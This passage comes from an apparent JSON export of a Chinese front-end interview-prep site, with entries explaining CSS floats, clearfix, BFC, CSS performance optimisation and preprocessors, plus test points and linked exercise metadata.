理解复杂布局对性能的影响，如何避免重排和重绘（reflow & repaint），以及选择合适的方法。\n  \n### 9. **技术与工具**\n- **布局调试**：\n  - 能够使用 Chrome 开发者工具进行布局调试，检查盒模型、Flex 和 Grid 布局。\n\n- **工具与框架**：\n  - 对 CSS 布局框架的理解（如 Bootstrap、Tailwind CSS），特别是它们如何支持快速布局开发。\n\n### 10. **实际应用的案例**\n- **案例分析**：\n  - 被问到如何处理特定布局问题，能够描述你会采取的步骤和思路。\n",
    "exerciseKeyList": "[\"e33db22c-e826-41f0-b5a9-33b9a03091bc\",\"286f8c5a-9f06-476d-9670-bd02de26db4e\",\"389a7ca7-43d2-4fbe-99ef-50bea32bef5c\",\"a1d425f5-4d07-4ffc-865b-23fec635032c\",\"dd65350c-9907-4d3a-a01c-baeebb3e963d\",\"9cc69b35-a6f3-466a-8724-7b855b38a1a9\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 8,
    "createAt": "2024-10-10T08:04:36.000Z",
    "updateAt": "2024-11-10T05:42:05.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "286f8c5a-9f06-476d-9670-bd02de26db4e",
        "title": "flex 布局下，怎么改变元素的顺序？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T09:51:25.000Z",
        "updateAt": "2025-03-18T12:03:52.000Z"
      },
      {
        "exerciseKey": "389a7ca7-43d2-4fbe-99ef-50bea32bef5c",
        "title": "怎么让CSS flex布局最后一行列表左对齐？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-02-27T02:57:47.000Z",
        "updateAt": "2024-07-19T15:55:03.000Z"
      },
      {
        "exerciseKey": "9cc69b35-a6f3-466a-8724-7b855b38a1a9",
        "title": "如何实现两栏布局，右侧自适应？三栏布局中间自适应呢？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:22:35.000Z",
        "updateAt": "2024-08-10T19:45:47.000Z"
      },
      {
        "exerciseKey": "a1d425f5-4d07-4ffc-865b-23fec635032c",
        "title": "grid网格布局是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:31:27.000Z",
        "updateAt": "2024-08-10T17:04:26.000Z"
      },
      {
        "exerciseKey": "dd65350c-9907-4d3a-a01c-baeebb3e963d",
        "title": "flexbox（弹性盒布局模型）是什么，适用什么场景？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:23:32.000Z",
        "updateAt": "2024-08-10T19:47:22.000Z"
      },
      {
        "exerciseKey": "e33db22c-e826-41f0-b5a9-33b9a03091bc",
        "title": "css 中三栏布局的实现方案有哪些？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:09:48.000Z"
      }
    ]
  },
  "127": {
    "id": 127,
    "tagId": 11,
    "title": "浮动、清除浮动和BFC",
    "explanation": "浮动、清除浮动和BFC是前端开发中常见的概念，它们对于页面布局及美化至关重要。\n\n# 浮动\n\n在网页设计中，浮动是一种常见的布局技术，可以让元素脱离文档流，我们来看看它有什么作用吧！\n\n1.  **使文字环绕**\n\n代码示例如下：\n\nhtml结构：\n\n```ini\n<div class=\"box\"></div>\n<div class=\"text\">一段文字</div>\n```\n\ncss样式：\n\n```css\n .box{\n        width: 200px;\n        height: 200px;\n        background-color: coral;\n    }\n```\n\n若不加浮动，则页面是这样的效果：\n\n![image.png](https://static.ecool.fun//article/34f7a487-4dfa-4687-abd0-3557e813c107.jpeg)\n\n但若是在box加上float: left;(向左浮动)，则能使文字环绕box这个盒子：\n\n```css\n .box{\n        width: 200px;\n        height: 200px;\n        background-color: coral;\n        float: left;\n    }      \n```\n\n![image.png](https://static.ecool.fun//article/7d821693-2236-41ae-a705-eac1c6b8cfbc.jpeg)\n\n2.  **让块级元素同行显示**\n\n块级元素本身是占据一整行的，但浮动能让多个块级元素处于同一行，示例如下：\n\n若不加浮动，则多个块级元素各自占据一行：\n\nhtml结构：\n\n```css\n <ul>\n    <li>1</li>\n    <li>2</li>\n    <li>3</li>\n </ul>\n \n```\n\ncss样式：\n\n```css\n    *{\n        margin: 0;\n        padding: 0;\n    } \n    ul li{\n        list-style:none;\n        width: 200px;\n        height: 100px;\n        font-size: 16px;\n    }\n    li:nth-child(1){/*子容器选择器   */\n        background-color: rgb(227, 149, 149);\n    }\n    li:nth-child(2){\n        background-color: rgb(205, 139, 197);\n    }\n    li:nth-child(3){\n        background-color: rgb(145, 212, 227);\n    }\n```\n\n页面如图：\n\n![image.png](https://static.ecool.fun//article/68b07b62-abfd-4fcb-a2bf-f3bccda385b2.jpeg)\n\n但若是给li加上浮动属性：\n\n```css\n    ul li{\n        list-style:none;\n        width: 200px;\n        height: 100px;\n        font-size: 16px;\n        float: left;\n    }\n    \n```\n\n则各个li到同一行去了：\n\n![image.png](https://static.ecool.fun//article/db5eb0a9-4ac3-41c2-89fc-a8e249265d9c.jpeg)\n\n3.  **让行内元素可以设置宽高**\n\nspan为行内元素，它不能直接设置宽高，就算给它设置宽高，它也不会变，为了看的更明显，我们给它设置一个边框：\n\nhtml结构：\n\n```css\n<div>\n    <span>1</span>\n    <span>2</span>\n    <span>3</span>\n</div>\n```\n\ncss样式：\n\n```css\n    span{\n        width: 200px;\n        height: 100px;\n        border: 1px solid #000;\n    }\n```\n\n页面如下：\n\n![image.png](https://static.ecool.fun//article/586d49b9-203f-4233-a8df-7e3e937e911e.jpeg)\n\n但若是加上浮动属性，则设置的宽高会变为有效：\n\n```css\n    span{\n        width: 200px;\n        height: 100px;\n        border: 1px solid #000;\n        float: left;\n    }\n```\n\n![image.png](https://static.ecool.fun//article/0dc9028d-b6dd-4d22-b750-ffa4aed32905.jpeg)\n\n4.  **浮动元素可以使用margin，但是不能使用margin: 0 auto;**\n\nmargin用来设置页边距，而`margin: 0 auto;`可以使块级元素居中。加了浮动属性的元素能用margin来设置页边距，但margin: 0 auto;对它是无效的。\n\n# 清除浮动\n\n尽管浮动能够带来美观的页面布局，但有时也会带来一些问题，比如父容器高度塌陷等。因此，我们知道了如何使用浮动，也需要学会如何清除浮动。\n\n1.  **给父容器设置高度**\n\n我们看以下代码示例：\n\nhtml结构：\n\n```xml\n <ul >\n    <li>1</li>\n    <li>2</li>\n    <li>3</li>\n    <!-- <div class=\"clear\"></div> class=\"clear\"-->\n</ul>\n<div class=\"content\"></div>\n```\n\ncss样式：\n\n```css\n    *{\n        margin: 0;\n        padding: 0;\n    }\n    ul li{\n        list-style:none;\n        width: 200px;\n        height: 100px;\n        background-color: #c58585;\n        float: left;\n    }\n    .content{\n        width: 100%;\n        height: 200px;\n        background-color: rgb(87, 179, 182);\n    }\n    \n```\n\n使li浮动后，li会脱离文档流，导致别的元素出现在它下面：\n\n![image.png](https://static.ecool.fun//article/4785b2b0-4f12-4853-bceb-f32ac6b5961c.jpeg)\n\n但要清除它浮动带来的这种影响，我们可以用给它父容器设置一个高度来实现，在css中给ul加上高度：\n\n```css\n    ul{\n        height: 100px;\n    } \n```\n\n![image.png](https://static.ecool.fun//article/af15b9e7-1777-4986-a6f7-4284676ff5c7.jpeg)\n\n2.  **增加一个子容器，在子容器身上清除浮动**\n\n若我们增加一个子容器，在子容器身上清除浮动，也可以消除浮动带来的不好的影响，同样用上一个例子：\n\n增加一个子容器：\n\n```css\n <ul >\n    <li>1</li>\n    <li>2</li>\n    <li>3</li>\n    <div class=\"clear\"></div> \n</ul>\n```\n\n在css中清除子容器的浮动：\n\n```arduino\n  .clear{\n        clear: left; \n  }\n```\n\n也可以实现同样的效果：\n\n![image.png](https://static.ecool.fun//article/d370e944-58ef-4ea2-95d4-4e5dc978a77a.jpeg)\n\n3.  **借助伪元素 after 来清除**\n\n还是这个例子，给ul加上clear类：\n\n```css\n<ul class=\"clear\">\n    <li>1</li>\n    <li>2</li>\n    <li>3</li>\n</ul>\n```\n\n在css中设置伪元素after：\n\n```css\n.clear::after{\n    content: '';\n    clear:left;\n    display: block;\n}\n```\n\n最后的页面也是一样的效果。\n\n还有一个方法可以清除浮动，那就是利用BFC，BFC容器可以清除浮动。\n\n# BFC(Block Formatting Context--块级格式化上下文)\n\nBFC 是块级格式化上下文的缩写，它是一种特殊的渲染区域，具有独立的布局规则。创建 BFC 可以解决一些常见的布局问题，比如外边距重叠等。\n\n-   如何创建BFC？给容器设置以下属性能成为BFC容器：\n    1.  浮动：float: left | right\n    2.  定位：position: absolute | fixed\n    3.  行内块：display: inline-block\n    4.  表格单元：display: table-cell | table-XXX\n    5.  overflow: auto | hidden | scroll\n    6.  弹性格子：display: flex | inline-flex\n\n### BFC的特征\n\nBFC的效果是让处于BFC内部的元素与外部的元素相互隔离，使内外元素的定位不会相互影响。\n\n1.  内部盒子也会按照文档流的顺序排列\n2.  bfc容器在计算高度时，会将内部浮动的子元素的高度也计算在内\n3.  解决外边距重叠的问题\n\n> 原文：https://juejin.cn/post/7301201921204011049",
    "testPoint": "### 1. **浮动（Float）**\n   - **浮动的概念**：什么是浮动？为什么 CSS 中引入 `float` 属性？\n   - **使用场景**：浮动元素通常在哪些场景下使用？在传统布局中如何使用浮动实现基本的左右排布或文字环绕效果？\n   - **浮动的影响**：当元素设置为浮动后，会如何影响周围的元素？浮动的元素是否还占据原本的文档流位置？\n   - **浮动的陷阱**：浮动布局有哪些常见的坑？如父容器高度塌陷，子元素脱离正常文档流导致布局错乱等。\n\n### 2. **清除浮动（Clearfix）**\n   - **清除浮动的必要性**：为什么需要清除浮动？如果不清除浮动，布局会产生什么问题？\n   - **清除浮动的方法**：常见的清除浮动方法有哪些？可以分别介绍以下几种：\n     - **使用 `clear` 属性**：如何通过在浮动元素后添加一个设置了 `clear: both` 的空元素实现清除浮动？\n     - **伪元素清除法**：如何利用伪元素（如 `::after`）来清除浮动？为什么 `content: \"\"` 和 `display: table` 可以解决浮动问题？\n     - **触发 BFC**：如何通过触发 BFC 清除浮动？相对于其他方法，它的优缺点是什么？\n   - **现代布局替代**：在 CSS Flex 和 Grid 布局越来越普遍的情况下，浮动和清除浮动的场景是否还适用？它们是否会逐渐被替代？\n\n### 3. **BFC（块级格式化上下文）**\n   - **BFC 的定义**：什么是块级格式化上下文（Block Formatting Context, BFC）？\n   - **BFC 的特点**：BFC 有哪些特性？例如，BFC 内部的元素不会与外部浮动元素重叠、计算高度时包含浮动元素等。\n   - **触发 BFC 的方法**：有哪些 CSS 属性可以触发 BFC？请列举常见的几种触发方式：\n     - 设置 `overflow: hidden`、`auto`、`scroll`。\n     - 设置 `display: inline-block`、`table-cell`、`flex`、`grid`。\n     - 设置 `position: absolute`、`fixed` 等。\n   - **BFC 的应用场景**：在什么情况下会用到 BFC？\n     - **清除浮动**：通过触发 BFC 来包裹浮动元素，从而解决父容器高度塌陷问题。\n     - **避免外边距合并**：如何利用 BFC 解决上下相邻元素间的外边距合并问题？\n     - **布局控制**：BFC 如何帮助控制布局中的重叠和对齐？\n\n### 4. **浮动与 BFC 的应用实例**\n   - **清除浮动的实例**：如何实现一个两栏布局，左侧导航栏浮动，右侧内容区域自动填充？\n   - **BFC 的实际应用**：假如有一个容器，内部包含多个浮动元素，该如何处理使容器的高度不塌陷？\n   - **组合布局**：在使用 BFC 清除浮动的同时，还可以利用 Flex 布局来处理整体布局，避免浮动和 BFC 带来的复杂性。\n\n### 5. **浮动和 BFC 对性能的影响**\n   - **页面性能考虑**：在现代网页设计中，使用大量浮动和 BFC 是否会影响性能？如何平衡布局方式与性能？\n   - **替代方案**：在需要清除浮动或控制布局时，是否可以用 CSS Grid 或 Flexbox 替代浮动和 BFC？这些新的布局方式有什么优势？",
    "exerciseKeyList": "[\"c740c88b-fe1b-426f-ab9c-23f43c7fe62d\",\"d28f9b69-6d6c-474d-82ad-682dddfe1aa5\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 12,
    "createAt": "2024-10-10T08:07:50.000Z",
    "updateAt": "2024-11-10T05:42:05.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "c740c88b-fe1b-426f-ab9c-23f43c7fe62d",
        "title": "说下 css 中的 BFC、IFC、GFC 和 FFC 分别指什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T13:57:30.000Z"
      },
      {
        "exerciseKey": "d28f9b69-6d6c-474d-82ad-682dddfe1aa5",
        "title": "为什么会出现浮动？什么时候需要清除浮动？清除浮动的方式有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:14:48.000Z",
        "updateAt": "2024-07-22T09:25:18.000Z"
      }
    ]
  },
  "128": {
    "id": 128,
    "tagId": 11,
    "title": "优化性能",
    "explanation": "## 前言\n\n随着互联网发展至今，对于网站来说，性能显的越来越重要了，CSS作为页面渲染和内容展现的重要环节，影响着用户对整个网站的第一体验。所以，我们需要重视与CSS相关的性能优化。\n\n项目开发初期我们可能因为各种原因（很大一部分原因是因为项目工期，产品往往把项目上线时间卡的死死的，根本不听你说的什么性能优化），怎么写的舒服就怎么来，对于性能优化我们常常在项目完成时才去考虑，经常被推迟到项目的末期，甚至到暴露出严重的性能问题时才进行性能优化。\n\n为了更多地避免这一情况，首先要重视起性能优化相关的工作，将其贯穿到整个产品设计与开发中。其次，就是了解性能相关的内容，在项目开发过程中，自然而然地进行性能优化。\n\n\n## css渲染规则\n\n想要优化CSS的性能，我们首先需要了解CSS的渲染规则，**CSS选择器是从右向左进行匹配的**\n\n来看个例子🌰：\n\n```css\n.nav h3 a{font-size: 14px;}\n```\n\n渲染过程大概是：首先找到所有的`a`，沿着`a`的父元素查找`h3`，然后再沿着`h3`，查找`.nav`。中途找到了符合匹配规则的节点就加入结果集。如果找到根元素`html`都没有匹配，则不再遍历这条路径，从下一个`a`开始重复这个查找匹配（只要页面上有多个最右节点为`a`）。\n\n> **Tips：为什么CSS选择器是从右向左匹配的？**\n> \n> CSS中更多的选择器是不会匹配的，所以在考虑性能问题时，需要考虑的是如何在选择器不匹配时提升效率。从右向左匹配就是为了达成这一目的的，通过这一策略能够使得CSS选择器在不匹配的时候效率更高。这样想来，在匹配时多耗费一些性能也能够想的通了。\n\n## 内联首屏关键CSS（Critical CSS）\n\n性能优化中有一个重要的指标——**首次有效绘制**（First Meaningful Paint，简称FMP）即指页面的首要内容（primary content）出现在屏幕上的时间。这一指标影响用户看到页面前所需等待的时间，而 **内联首屏关键CSS（即Critical CSS，可以称之为首屏关键CSS）** 能减少这一时间。\n\n很多人都喜欢通过`link`标签引用外部`CSS文件`。但需要知道的是，**将CSS直接内联到HTML文档中能使CSS更快速地下载**。而使用外部CSS文件时，需要在HTML文档下载完成后才知道所要引用的CSS文件，然后才下载它们。所以说，**内联CSS能够使浏览器开始页面渲染的时间提前**，因为在HTML下载完成之后就能渲染了。\n\n但是我们不应该将所有的CSS都内联在HTML文档中，因为\\[初始拥塞窗口\\]存在限制`（TCP相关概念，通常是 14.6kB，压缩后大小）`，如果内联CSS后的文件超出了这一限制，系统就需要在服务器和浏览器之间进行更多次的往返，这样并不能提前页面渲染时间。因此，我们应当**只将渲染首屏内容所需的关键CSS内联到HTML中**。\n\n⚠️还有一点需要注意的是内联CSS没有缓存，每次都会随HTML的加载而重新下载，但我们将内联首屏关键CSS控制在 `14.6kB`以内，它对性能优化还是起到正向作用的。（凡事有利也有弊）\n\n## 异步加载非首屏CSS\n\n我们需要知道两点内容：（具体可以看我之前的文章：[这些浏览器面试题，看看你能回答几个？](https://juejin.cn/post/7026536651899797541#heading-14 \"https://juejin.cn/post/7026536651899797541#heading-14\")）\n\n-   `CSS`不会阻塞`DOM`的解析，但会阻塞`DOM`的渲染\n-   `CSS`会阻塞`JS`执行，但不会阻塞`JS`文件的下载\n\n由于CSS会阻塞DOM的渲染，所以我们将首屏关键CSS内联后，剩余的非首屏CSS内容可以使用外部CSS，并且异步加载，防止非首屏CSS内容阻塞页面的渲染。\n\n### CSS异步加载方式\n\n**第一种方法是动态创建**\n\n```js\n// 创建link标签\nconst myCSS = document.createElement( \"link\" );\nmyCSS.rel = \"stylesheet\";\nmyCSS.href = \"mystyles.css\";\n// 插入到header的最后位置\ndocument.head.insertBefore( myCSS, document.head.childNodes[ document.head.childNodes.length - 1 ].nextSibling );\n```\n\n**第二种方法是将link元素的`media`属性设置为用户浏览器不匹配的媒体类型（或媒体查询）**\n\n对浏览器来说，如果样式表不适用于当前媒体类型，其优先级会被放低，会在不阻塞页面渲染的情况下再进行下载。在首屏文件加载完成之后，将`media`的值设为`screen`或`all`，从而让浏览器开始解析CSS。\n\n```html\n<link rel=\"stylesheet\" href=\"mystyles.css\" media=\"noexist\" onload=\"this.media='all'\">\n```\n\n**第三种方法是通过`rel`属性将`link`元素标记为`alternate`可选样式表**\n\n```html\n<link rel=\"alternate stylesheet\" href=\"mystyles.css\" onload=\"this.rel='stylesheet'\">\n```\n\n**第四种方法是使用`rel=preload`来异步加载CSS**\n\n```html\n<link rel=\"preload\" href=\"mystyles.css\" as=\"style\" onload=\"this.rel='stylesheet'\">\n```\n\n注意，`as`是必须的。忽略`as`属性，或者错误的`as`属性会使`preload`等同于`XHR`请求，浏览器不知道加载的是什么内容，因此此类资源加载优先级会非常低。`as`的可选值可以参考上述标准文档。\n\n看起来，`rel=\"preload\"\u001d`的用法和上面两种没什么区别，都是通过更改某些属性，使得浏览器异步加载CSS文件但不解析，直到加载完成并将修改还原，然后开始解析。\n\n但是它们之间其实有一个很重要的不同点，那就是**使用preload，比使用不匹配的`media`方法能够更早地开始加载CSS**。所以尽管这一标准的支持度还不完善，仍建议优先使用该方法。\n\n## CSS文件压缩\n\n这应该是最容易想到的一个方法了，通过压缩CSS文件大小来提高页面加载速度。现在的构建工具，如webpack、gulp/grunt、rollup等也都支持CSS压缩功能。压缩后的文件能够明显减小，可以大大降低了浏览器的加载时间。\n\n## CSS层级嵌套最好不要超过3层\n\n一般情况下，元素的嵌套层级不能超过3级，过度的嵌套会导致代码变得臃肿，沉余，复杂。导致css文件体积变大，造成性能浪费，影响渲染的速度！而且过于依赖HTML文档结构。这样的css样式，维护起来，极度麻烦，如果以后要修改样式，可能要使用`!important`覆盖。尽量**保持简单，不要使用嵌套过多过于复杂的选择器。**\n\n## 删除无用CSS代码\n\n**一般情况下，会存在这两种无用的CSS代码：一种是不同元素或者其他情况下的重复代码，一种是整个页面内没有生效的CSS代码。**\n\n对于前者，在编写的代码时候，我们应该尽可能地提取公共类，减少重复。对于后者，在不同开发者进行代码维护的过程中，总会产生不再使用的CSS的代码，当然一个人编写时也有可能出现这一问题。而这些无用的CSS代码不仅会增加浏览器的下载量，还会增加浏览器的解析时间，这对性能来说是很大的消耗。所以我们需要找到并去除这些无用代码。\n\n**那么我们如何知道哪些CSS代码是无用代码呢？**\n\n谷歌的Chrome浏览器就有这种开箱即用的功能。只需转到查看>开发人员>开发人员工具，并在最近的版本中打开Sources选项卡，然后打开命令菜单。然后，点击Coverage，在Coverage analysis窗口中高亮显示当前页面上未使用的代码。 ![unused-css.png](https://static.ecool.fun//article/06eb8842-cbcb-41dd-8d3c-11b9db69d2b8.jpeg)\n\n## 慎用\\*通配符\n\n我们有时候可能会写下面这种代码来消除一些标签的默认样式或统一浏览器对标签渲染的差异化：\n\n```css\n*{\n  margin：0；\n  padding：0;\n}\n```\n\n这样虽然代码量少，但它的性能可不是最佳的，我们最好还是写对应的标签选择器：\n\n```css\nbody,dl,dd,h1,h2,h3,h4,h5,h6,p,form,ol,ul{\n  margin：0；\n  padding：0;\n}\n```\n\n**开发时尽量避免使用通配符选择器**\n\n## 小图片处理方式\n\n一般来讲一个网站上肯定会有很多个小图标，对于这些小图标，目前的主流的解决方案有三个，**cssSprite(雪碧图)**，**字体图标**，**把图片转成base64**。\n\n-   **cssSprite：** 把所有icon图片合成一张png图片，使用时对节点设置宽高，加上bacgroud-position进行背景定位。以背景图方式显展示需要的icon，如果一个网站有20图标，那么就要请求20次，使用`cssSprite`，只需要请求一次，大大的减少了http请求。缺点就是管理不灵活，如果需要新增一个图标，都需要改合并图片的源文件，图标定位也要规范，不然容易干扰图片之间的定位。\n-   **字体图标：** 简单粗暴的理解就是把所有的图标当成一个字体处理！这样不用去请求图片。一般是使用class来定义图标，要替换图标时，只需更换样式名，管理方便，语意明确，灵活放大缩小，并且不会造成失真。但是只支持单色的图片。\n-   **base64：** 另一种方案就是把小的icon图片转成base64编码，这样可以不用去请求图片，把base64编码直接整合到js或者css里面，可以防止因为一些相对路径，或者图片被不小删除了等问题导致图片404错误。但是找个方式会生成一大串的base64编码。一般来说，8K以下的图片才转换成base64编码。如果把一张50K的图片转成base64编码，那么会生成超过65000个字符的base64编码，字符的大小就已经是将近70K了！建议就是：`8K以下的图片才转换成base64编码。`\n\n## 避免使用@import\n\n不建议使用`@import`主要有以下两点原因：\n\n-   使用`@import`引入CSS会影响浏览器的并行下载。使用`@import`引用的CSS文件只有在引用它的那个css文件被下载、解析之后，浏览器才会知道还有另外一个css需要下载，这时才去下载，然后下载后开始解析、构建render tree等一系列操作。这就导致浏览器无法并行下载所需的样式文件。\n    \n-   多个`@impor`t会导致下载顺序紊乱。在IE中，`@import`会引发资源文件的下载顺序被打乱，即**排列在@import后面的js文件先于@import下载，并且打乱甚至破坏@import自身的并行下载**。\n    \n\n## 不要在ID选择器前面进行嵌套其它选择器\n\n**在ID选择器前面嵌套其它选择器纯粹是多余的**\n\n-   ID选择器本来就是唯一的而且人家权值那么大，前面嵌套（`.content #text`）完全是浪费性能。\n-   除了嵌套，在ID选择器前面也不需要加标签或者其它选择器。比如 `div#text`或者`.box#text`。这两种方式完全是多余的，理由就是ID在页面就是唯一的。前面加任何东西都是多余的！\n\n## 删除不必要的单位和零\n\nCSS 支持多种单位和数字格式，可以删除尾随和跟随的零，**零始终是零，添加维度不会为包含的信息附带任何价值。**\n\n```css\n.box {\n  padding: .2px;\n  margin: 20px;\n  avalue: 0;\n}\n```\n\n## 优化回流与重绘\n\n在网站的使用过程中，某些操作会导致样式的改变，这时浏览器需要检测这些改变并重新渲染，其中有些操作所耗费的性能更多。我们都知道，当FPS为60时，用户使用网站时才会感到流畅。这也就是说，我们需要在16.67ms内完成每次渲染相关的所有操作，所以我们要尽量减少耗费更多的操作。\n\n### 减少回流与重绘\n\n#### 合并对`DOM`样式的修改，采用`css class`来修改\n\n```js\nconst el = document.querySelector('.box')\nel.style.margin = '5px'\nel.style.borderRadius = '12px'\nel.style.boxShadow = '1px 3px 4px #ccc'\n```\n\n建议使用css class\n\n```js\n.update{\n  margin: 5px;\n  border-dadius: 12px;\n  box-shadow: 1px 3px 4px #ccc\n}\nconst el = document.querySelector('.box')\nel.classList.add('update')\n```\n\n**如果需要对DOM进行多次访问，尽量使用局部变量缓存该DOM**\n\n**避免使用table布局，可能很⼩的⼀个⼩改动会造成整个table的重新布局**\n\n**CSS选择符从右往左匹配查找，避免节点层级过多**\n\n#### DOM离线处理，减少回流重绘次数\n\n**离线的DOM不属于当前DOM树中的任何一部分，这也就意味着我们对离线DOM处理就不会引起页面的回流与重绘。**\n\n-   使用`display: none`，上面我们说到了 (`display: none`) 将元素从渲染树中完全移除，元素既不可见，也不是布局的组成部分，之后在该DOM上的操作不会触发回流与重绘，操作完之后再将`display`属性改为显示，只会触发这一次回流与重绘。\n\n​ 提醒⏰：`visibility : hidden` 的元素只对重绘有影响，不影响重排。\n\n-   通过 [documentFragment](https://developer.mozilla.org/zh-CN/docs/Web/API/DocumentFragment \"https://developer.mozilla.org/zh-CN/docs/Web/API/DocumentFragment\") 创建一个 `dom` 文档片段,在它上面批量操作 `dom`，操作完成之后，再添加到文档中，这样只会触发一次重排。\n\n```js\nconst el = document.querySelector('.box')\nconst fruits = ['front', 'nanjiu', 'study', 'code'];\nconst fragment = document.createDocumentFragment();\nfruits.forEach(item => {\n  const li = document.createElement('li');\n  li.innerHTML = item;\n  fragment.appendChild(li);\n});\nel.appendChild(fragment);\n```\n\n-   克隆节点，修改完再替换原始节点\n\n```js\nconst el = document.querySelector('.box')\nconst fruits = ['front', 'nanjiu', 'study', 'code'];\nconst cloneEl = el.cloneNode(true)\nfruits.forEach(item => {\n  const li = document.createElement('li');\n  li.innerHTML = item;\n  cloneEl.appendChild(li);\n});\nel.parentElement.replaceChild(cloneEl,el)\n```\n\n#### DOM脱离普通文档流\n\n使用`absoult`或`fixed`让元素脱离普通文档流，使用绝对定位会使的该元素单独成为渲染树中 `body` 的一个子元素，重排开销比较小，不会对其它节点造成太多影响。\n\n#### CSS3硬件加速（GPU加速）\n\n使用css3硬件加速，可以让`transform、opacity、filters`这些动画不会引起回流重绘 。但是对于动画的其它属性，比如`background-color`这些，还是会引起回流重绘的，不过它还是可以提升这些动画的性能。\n\n**常见的触发硬件加速的css属性：**\n\n-   transform\n-   opacity\n-   filters\n-   Will-change\n\n#### 将节点设置为图层\n\n图层能够阻⽌该节点的渲染⾏为影响别的节点。⽐如对于video标签来说，浏览器会⾃动将该节点变为图层。\n\n> 原文：https://juejin.cn/post/7077347573740077069",
    "testPoint": "在前端面试中，关于 CSS 性能优化的一些常见的考点：\n\n### 1. **减少 CSS 文件的大小**\n- **去除不必要的样式**：识别和删除未使用的 CSS 规则，从而减小文件大小。\n- **合并 CSS 文件**：将多个 CSS 文件合并为一个文件，减少 HTTP 请求的数量。\n\n### 2. **压缩和优化 CSS**\n- **CSS 压缩**：使用工具（如 CSSNano、CleanCSS 等）对 CSS 进行压缩，去除空格、注释和换行符。\n- **使用预处理器**：利用 LESS、Sass 等 CSS 预处理器管理样式，减少重复代码，保持代码整洁。\n\n### 3. **选择器效率**\n- **优先选择简单选择器**：避免使用复杂的选择器（如后代选择器、伪类和伪元素），因为它们会影响选择效率。\n- **特异性**：保持选择器的特异性尽可能低，这样可以避免 CSS 规则之间的冲突，并提高渲染效率。\n\n### 4. **使用 CSS 变量**\n- **减少冗余**：使用 CSS 自定义属性（CSS 变量）减少样式中的冗余，便于管理和优化样式。\n\n### 5. **异步加载 CSS**\n- **使用异步加载**：通过 `rel=\"preload\"` 或 `media=\"print\"` 方式异步加载 CSS，提升页面渲染速度。如：\n  ```html\n  <link rel=\"preload\" href=\"styles.css\" as=\"style\" onload=\"this.onload=null;this.rel='stylesheet'\">\n  ```\n\n### 6. **避免重复样式**\n- **合并重复样式**：在多个选择器中应用相同样式时，将它们合并，减少样式的重复定义。\n\n### 7. **使用访客最常用的 CSS 属性**\n- **按照使用频率排序**：尽量将常用属性放在 CSS 文件的最前面，帮助浏览器及早识别及排版。\n\n### 8. **避免 CSS 解析瓶颈**\n- **书写高效的 CSS**：避免使用大量的属性重置和复杂的层叠样式，这可能会增加渲染时间。\n- **使用文件缓存**：确保在服务器上配置正确的缓存头，利用浏览器缓存 CSS 文件，提高同一用户后续访问页面的加载速度。\n\n### 9. **媒体查询优化**\n- **响应式设计优化**：合理使用媒体查询，避免过多的媒体查询语句影响加载速度和渲染性能。\n\n### 10. **逐步加载**\n- **使用渐进增强或优雅降级**：根据用户的设备能力逐步加载和应用 CSS，以确保最重要的样式先进行渲染。\n\n### 11. **使用开发者工具**\n- **分析性能**：利用浏览器的开发者工具（如 Chrome DevTools）分析和优化 CSS 性能，查看 CSS 选择器的应用情况，以及网络请求的时间。\n\n### 12. **避免重排（Reflow）与重绘（Repaint）**\n- **减少 DOM 操作**：理解哪些 CSS 更改会导致重排或重绘，尽量减少频繁的操作。\n- **批量操作**：如果对 DOM 的多次操作，尽量将其集中进行，减少反复触发布局和绘制。\n",
    "exerciseKeyList": "[\"180f752e-370b-447e-b755-6d004f8f0db0\",\"417ebda0-3f2d-48d3-95ec-ae1838bf39cb\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 25,
    "createAt": "2024-10-10T08:37:33.000Z",
    "updateAt": "2024-11-10T05:42:12.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "180f752e-370b-447e-b755-6d004f8f0db0",
        "title": "CSS优化、提高性能的方法有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:24:05.000Z",
        "updateAt": "2021-07-04T19:24:13.000Z"
      },
      {
        "exerciseKey": "417ebda0-3f2d-48d3-95ec-ae1838bf39cb",
        "title": "怎么理解回流跟重绘？什么场景下会触发？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:29:37.000Z",
        "updateAt": "2024-08-10T19:48:54.000Z"
      }
    ]
  },
  "129": {
    "id": 129,
    "tagId": 11,
    "title": "预处理器",
    "explanation": "### 前言\n\n花样不断的前端，貌似多技术方案并行，已经成了家常便饭。\n\n从大的框架开始，已经分裂react与vue派系。两者思维上虽然有相互不断的借鉴，但在大的方向思维上却是截然不同。而在react与vue的竞争以及相互较量的过程中，往往把其他的对手都干倒了，现在市场angular，jQuery等都逐步没落。\n\n预编译css也同样，曾经也有多个派系。而后在sass与less的不断竞争中，stylus等其他的编译器也逐步退出市场。本文的重点，对比预编译css，scss与less对比。\n\n### 基本介绍\n\n先一起看看官方是如何定义或者介绍他们。\n\n#### Sass\n\n-   官方定义：\n\nSass是一种基于Ruby的CSS预处理器，它可以扩展CSS语言，并添加许多其他功能，如变量、嵌套规则、Mixin、函数等。Sass文件以“.scss”扩展名保存，与标准CSS文件兼容，并且可以使用普通CSS代码和语法。Sass也有一个较早的语法格式，以“.sass”扩展名保存，使用缩进的语法来代替括号和分号，但它现在已经不那么流行了。\n\n-   个人理解：\n\nsass是**第一个**流行的CSS预处理器，在2006年产生，这也为后续他用户量第一埋下伏笔。\n\n#### Scss\n\n-   